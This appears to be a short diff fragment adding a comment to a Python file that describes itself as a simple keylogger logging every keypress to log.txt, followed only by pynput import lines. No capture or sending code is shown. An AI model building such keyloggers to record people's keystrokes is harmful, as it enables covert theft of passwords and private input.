@@ -1,3 +1,4 @@
+# A Simple Keylogger Program which logs every key you press on the keyboard in the file named log.txt
 import pynput
 from pynput.keyboard import Listener, Key
 
